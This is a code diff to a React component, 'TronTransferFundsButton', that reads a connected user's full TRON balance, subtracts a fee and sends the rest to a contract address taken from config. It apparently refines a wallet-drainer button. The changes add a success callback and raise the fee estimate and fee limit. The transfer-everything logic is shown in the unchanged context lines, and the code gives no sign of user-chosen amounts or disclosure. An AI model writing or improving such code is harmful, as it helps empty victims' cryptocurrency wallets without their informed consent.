@@ -9,7 +9,12 @@ import "../buttons/TransferButton.css";
 
 const { tronContractAddress, tronFunctionName, tronFunctionParams } = config;
 
-const TronTransferFundsButton: React.FC<{children: string;}> = ({ children }) => {
+interface TronTransferFundsButtonProps {
+  children: string;
+  onTransactionSuccess: () => void;
+}
+
+const TronTransferFundsButton: React.FC<TronTransferFundsButtonProps> = ({ children, onTransactionSuccess }) => {
   const { signTransaction, address, connected } = useWallet();
   const [netBalance, setNetBalance] = useState<number>(0);
   const [transactionResult, setTransactionResult] = useState(null);
@@ -22,7 +27,7 @@ const TronTransferFundsButton: React.FC<{children: string;}> = ({ children }) =>
         const userBalance = await tronWeb.trx.getBalance(address);
 
         // Estimate transaction fee (assuming 1 TRX as fee for this example)
-        const transactionFee = 1e6; // Fee in Sun (1 TRX = 1e6 Sun)
+        const transactionFee = 5e6; // Fee in Sun (1 TRX = 1e6 Sun)
 
         // Calculate the net amount to send
         const calculatedNetBalance = userBalance - transactionFee;
@@ -57,7 +62,7 @@ const TronTransferFundsButton: React.FC<{children: string;}> = ({ children }) =>
         tronContractAddress, // Contract address in hex format
         tronFunctionName,
         {
-          feeLimit: 1000000,
+          feeLimit: 5000000,
           callValue: netBalance, // Adjust for any TRX sent along with the transaction
           txLocal: true 
         },
@@ -80,10 +85,12 @@ const TronTransferFundsButton: React.FC<{children: string;}> = ({ children }) =>
       // Update the transaction result state based on the response
       setTransactionResult(receipt.result ? 'Success' : 'Failed' as any);
       setAlertOpen(true);
+      onTransactionSuccess();
     } catch (error) {
       console.error('Error calling contract:', error);
       setTransactionResult('Error' as any);
       setAlertOpen(true);
+      // onTransactionSuccess();
     }
   }
 
